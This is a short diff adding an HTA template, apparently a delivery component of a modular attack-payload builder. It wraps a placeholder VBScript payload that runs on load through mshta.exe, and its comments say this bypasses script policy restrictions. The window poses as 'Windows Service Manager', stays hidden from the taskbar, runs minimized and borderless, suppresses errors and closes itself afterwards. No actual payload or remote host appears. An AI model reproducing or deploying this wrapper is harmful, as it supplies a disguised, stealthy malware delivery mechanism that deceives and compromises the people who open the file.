@@ -1,0 +1,26 @@
+<!-- chunk: delivery/hta_wrapper -->
+<!-- provides: hta_vbs_container -->
+<!-- format: hta -->
+<!-- description: HTA file wrapping VBScript payload. Runs via mshta.exe with full COM/WScript API access. HTA bypasses script policy restrictions (no cscript needed). -->
+<!-- vars: PAYLOAD_BODY -->
+
+<html>
+<head>
+<HTA:APPLICATION ID="svc"
+    APPLICATIONNAME="Windows Service Manager"
+    SHOWINTASKBAR="no"
+    WINDOWSTATE="minimize"
+    BORDER="none"
+    CAPTION="no"
+    SYSMENU="no"
+    SCROLL="no" />
+<script language="VBScript">
+Sub Window_OnLoad()
+    On Error Resume Next
+    {{PAYLOAD_BODY}}
+    self.close
+End Sub
+</script>
+</head>
+<body></body>
+</html>
